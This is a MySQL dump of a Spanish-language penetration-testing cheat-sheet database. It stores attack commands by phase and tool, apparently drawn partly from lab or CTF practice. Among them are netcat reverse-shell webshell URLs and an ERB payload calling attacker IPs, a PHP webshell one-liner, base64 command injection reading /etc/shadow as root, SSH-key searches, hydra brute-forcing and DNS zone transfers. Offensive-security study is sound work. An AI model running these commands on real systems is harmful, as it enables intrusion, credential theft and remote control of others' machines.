...
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 12-09-2025 a las 04:32:38
...
(29, 'Escalar privilegios./LinEnum.sh', './LinEnum.sh', 'Enumerar debilidades en linux para escalar privilegios', 'https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\r\nhttps://github.com/rebootuser/LinEnum\r\n\r\n#Dependiento de los resultados de Lin, Podemos consultar la siguiente pagina\r\nhttps://gtfobins.github.io/gtfobins/php/', '742025060923.zip', 1, 4, 10),
...
(48, 'python, shadow, passwd, leer', 'print open(&amp;quot;/etc/passwd&amp;quot;, &amp;quot;r&amp;quot;).read()', 'Leer archivo con python', 'Una ves que se tiene acceso a la ejecucion de comandos con python', '', 1, 4, 26),
...
(61, 'nc webshell url', 'http://0.0.0.0/shell.php?cmd=nc -c sh 1.1.1.1 13000', 'Conexion de webshell con nc mediante url', 'Antes se debe poner el puerto 13000 en escucha\r\n1.1.1.1 es la IP del atacante', '', 1, 2, 10),
(62, 'RSA key', 'ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2&amp;gt; /dev/null', 'Listar claves RSA', '', '', 1, 4, 10),
(63, 'webshell php', 'echo &amp;quot;&amp;lt;?php system($_GET[&#039;cmd&#039;]);?&amp;gt;&amp;quot; &amp;gt; /var/www/html/shell.php', 'Escribir una web shell mediante consola (PHP)', '', '', 1, 2, 27),
...
(76, 'starttls, 25, 587, 465, SMTP', '#1 telnet 0.0.0.0 25\r\n#2 sudo nmap 0.0.0.0 -p25 --script smtp-open-relay -v\r\n#4 smtp-user-enum -M VRFY -U snmp.txt -t 0.0.0.0 -m 60 -w 20', 'Enumeracion SMTP', '#1 iniciar una conexion SMTP.\r\n#2 Listar comandos validos (VRFY checa si existe un comando)\r\n#3 obtener mayor informaci&amp;oacute;n sobre el servicio\r\n#4 listar usuarios validos a partir de una lista', '', 1, 1, 10),
...
(94, 'ansible playbooks', '#1 Creamos un archivo (plantilla) .yml\r\n#2 lo subimos a la maquina victima\r\n#3 sudo /usr/local/bin/templater /tmp/clave.yml', 'Ejecucion de plantilla asible para escalar privilegio', '#esta vulnerabilidad se aprovecha por la tegcnologia de ansimble pasando por par&amp;aacute;metro una plantilla .yml\r\n#1 Las plantillas se encuentran adjuntas\r\n#2 puede utilizar un servidor de python y wget\r\n#3 Ejecutamos en la carpeta /tmp la plantilla para obtener la clave privada\r\n\r\nBuscar en google: &amp;quot;ansible privilege escalation&amp;quot;', '232025210839.zip', 1, 4, 10),
...
(104, 'broccoli-compass, catcabbage', '#1 sudo /usr/local/bin/cabbage  var user_provided_filename = &#039;$(cat /etc/shadow &amp;gt; ./flag.txt;);&#039;;', 'Escalar privilegios con vulnerabilidad en &amp;quot;broccoli-compass&amp;quot;', '#1 Esta vulnerabilidad nos permite ejecutar comandos como root', '', 1, 4, 10),
...
(124, 'dns dig 53 CH bind', '#1 dig any dominio.org\r\n#2 dig ns dominio.org @0.0.0.0\r\n#3 dig CH TXT version.bind 0.0.0.0\r\n#4 dig axfr inlanefreight.htb @10.129.90.178\r\n#5 dig soa www.inlanefreight.com', 'Enumeraci&amp;oacute;n de DNS con dig', '#1 Consultar todos los registros DNS\r\n#3 consultar version del servidor\r\n#4 Extraer la zona de transferencia (Realizar por cada subdominio encontrado)\r\n\r\nRuta en linux: \r\ncat /etc/bind/named.conf.local\r\ncat /etc/bind/db.domain.com\r\ncat /etc/bind/db.0.0.0.0', '', 1, 1, 40),
...
(138, 'dns 53', 'for sub in $(cat tools/secLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.90.178 | grep -v &#039;;xyz|SOA&#039; | sed -r &#039;/^xyzs*$/d&#039; | grep $sub | tee -a subdomains.txt;done', 'Ataque de fuerza bruta para obtener subdominios', '', '', 1, 1, 10),
(139, 'dnsenum', 'dnsenum --dnsserver 10.129.90.178 --enum -p 0 -s 0 -o subdomainsdns.txt -f tools/secLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb', 'Enumeracion de subdominios DNS', '', '', 1, 1, 48),
(142, 'header X-Forwarded localhost 127.0.0.1 request', '#1 X-Forwarded-For:127.0.0.1\r\n\r\n#2\r\nX-Real-IP: 127.0.0.1\r\nX-Originating-IP: 127.0.0.1', 'Indicar al servidor que nuestra IP es local (X-Forwarded-FOR:)', '#1 Agregar este valor en el header de un request, permite indicar al servidor que nuestra ip es local\r\n\r\n#2 no probados aun', '', 1, 1, 53),
(144, 'BlackCat CMS', '#1 http://catcabbage.echocity-f.com/modules/lib_jquery/plugins/webshell/webshell.php?cmd=nc%20-c%20sh%2010.10.15.30%208989', 'Acceso inicial (Black Cat CMS)', '#1 el archivo que se cargue debe de ser en .zip\r\n\r\n\r\nNota: exploit https://www.exploit-db.com/exploits/51605\r\n\r\n\r\nOmitir en la ruta del exploit la carpeta /upload', '', 1, 2, 32),
(145, 'echo ls', 'recurso/*', 'Listar echo sin opcion ls (*)', 'Cuando no se cuenta con la opci&amp;oacute;n de &amp;quot;ls&amp;quot; se puede listar utilizando * (Investigar)', '', 1, 1, 10),
(146, 'callback php', 'Enviar por &amp;quot;GET&amp;quot; el nombre de la funci&amp;oacute;n y por &amp;quot;POST&amp;quot; el par&amp;aacute;metro', 'Explotando una funciona callable (callback)', 'Esta forma de ejecutar una funciona es peligrosa si no se parsea adecuadamente, un atacante puede llamar por &amp;quot;GET&amp;quot; una funci&amp;oacute;n como &amp;quot;system&amp;quot; y por &amp;quot;POST&amp;quot; enviar un parametro del sistema\r\n\r\n#As&amp;iacute; se imprimen los resultados de lado del servidor (var_dump(array_walk($_POST,$_GET[&#039;callback&#039;]));)', '', 1, 2, 27),
(147, 'php, callback', '#1 %s=variable a definir mediante el env&amp;iacute;o de un par&amp;aacute;metro', 'Explotando callback (definir el nombre de una constante (%s))', '#1 %s toma el valor del par&amp;aacute;metro enviado\r\n\r\n\r\n#asi se imprimen los resultados &amp;quot;var_dump(array_walk($_POST,$_GET[&#039;callback&#039;]));&amp;quot;', '', 1, 2, 27),
(148, 'php callback', '#1 ?callback=var_dump', 'Otra forma de explotar callback', 'por &amp;quot;GET&amp;quot; se env&amp;iacute;a el nombre de la funci&amp;oacute;n a explotar y como valor el comando a ejecutar', '', 1, 2, 27);
INSERT INTO `comandos` (`id_comando`, `etiquetas`, `comando`, `descripcion`, `detalles`, `archivos`, `id_area`, `id_fase`, `id_herramienta`) VALUES
(149, 'sqlmap saveitem burpsuite', 'sqlmap -r saveitem --file-read=/etc/passwd', 'Leer un archivo a partir de una injecci&amp;oacute;n sqlmap', '', '', 1, 2, 2),
(150, 'find, bin ', '#1 find / -name &amp;quot;passwd&amp;quot; 2&amp;gt;/dev/null\r\n#2 find  / -perm -u=s -type f 2&amp;gt;/dev/null\r\n#3 find / -name &amp;quot;credential*.txt&amp;quot; 2&amp;gt;/dev/null', 'busqueda de archivos para escalar privilegios', '#1 buscar por cadena\r\n#2 buscar binarios\r\n\r\nFuente:\r\nhttps://exploit-notes.hdks.org/exploit/linux/privilege-escalation/', '', 1, 4, 10),
(151, 'rb ruby erb shell', '#1 &amp;lt;%= `env` %&amp;gt; \r\n#2 &amp;lt;%= `nc -e /bin/sh 1.1.1.1 13000` %&amp;gt;', 'Platillas ERB para reverseshell (acceso inicial)', '', '', 1, 2, 54),
(152, 'hydra post diccionario login', 'hydra -l admin -P tools/secLists/rockyou.txt 0.0.0.0 http-post-form &amp;quot;/?t=Login:login=^USER^&amp;amp;password=^PASS^:Wrong password&amp;quot; -V -f', 'Ataque de diccionario con hydra a login web (POST)', 'Si l o p son min&amp;uacute;sculas se debe indicar un diccionario y may&amp;uacute;sculas cuando se conoce el valor.\r\n\r\n-f pausa el ataque al encontrar una respuesta\r\n-V muestra los intentos', '', 1, 2, 11),
(153, 'rails-routes-to-json, rtoson, node, abantecart', '#1 sudo /usr/local/bin/rtoson &#039;{&amp;quot;command&amp;quot;: &amp;quot;echo d2hvYW1pID4gd2hvYW1pLnR4dA== | base64 -d | bash&amp;quot;}&#039;\r\n#2 sudo /usr/local/bin/rtoson &#039;{&amp;quot;command&amp;quot;: &amp;quot;echo Y2F0IC9ldGMvc2hhZG93ID4gc2hhZG93LnR4dA== | base64 -d | bash&amp;quot;}&#039;', 'Escalacion de privilegios aprovechando una libreria (rails-routes-to-json) que se ejecuta como root (rtoson)', '#1 ejecuta el comando whoami como root y el resultado lo almacena en el archivo whoami.txt\r\n#2 ejecuta el comando cat /etc/shadow como root y el resultado lo almacena en el archivo shadow.txt\r\n\r\nNota: la inyecci&amp;oacute;n de comandos es posible porque los datos de entrada (json) no est&amp;aacute;n debidamente sanitizados.\r\n-los comandos deben ingresarse en base64 para evitar errores por caracteres no permitidos\r\n\r\npermisos:(ALL : ALL) NOPASSWD: /usr/local/bin/rtoson', '', 1, 4, 10),
(154, 'abantecart', '#1 http://0.0.0.0/resources/image/18/7a/1.php?cmd=nc -c sh 1.1.1.1 13000', 'Acceso inicial (RCE) en cms abantecart (con credenciales de admin)', '#1 la ruta cambia cuando cada que se carga un archivo\r\n\r\n-credenciales utilizadas (admin:abantecart) \r\n\r\nVersion demo: https://www.abantecart.com/shopping-cart-demo\r\nExploit:https://www.exploit-db.com/exploits/51058', '', 1, 2, 32);
...
(2, 'Acceso inicial', 2, 1),
(4, 'Escalacion de privilegios', 3, 1),
(7, 'C2', 6, 1),
(9, 'Avace lateral', 5, 1),
...
(1, 'Nmap', 'cheats:\r\n\r\nhttps://github.com/ekol-x9/nmap-cheatsheet', '872025210829.pdf'),
(2, 'SQLMap', '', ''),
(3, 'Metasploit', 'sn', NULL),
(4, 'Netcat', '', NULL),
(9, 'Comandos Windows', '', NULL),
(10, 'Comandos Linux', '', '352025210846.pdf'),
(11, 'Hydra', '', NULL),
(12, 'testssl', '', NULL),
(13, 'theHarvester', '', NULL),
(14, 'cewl', 'Source:https://www.kali.org/tools/cewl/', ''),
(15, 'curl', '', NULL),
(25, 'Tips', '', NULL),
(26, 'Python', '', NULL),
(27, 'PHP', '', NULL),
...
--
ALTER TABLE `comandos`
  MODIFY `id_comando` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=155;

--
-- AUTO_INCREMENT de la tabla `fases`
--
ALTER TABLE `fases`
  MODIFY `id_fase` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;

--
-- AUTO_INCREMENT de la tabla `herramientas`
--
ALTER TABLE `herramientas`
  MODIFY `id_herramienta` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;
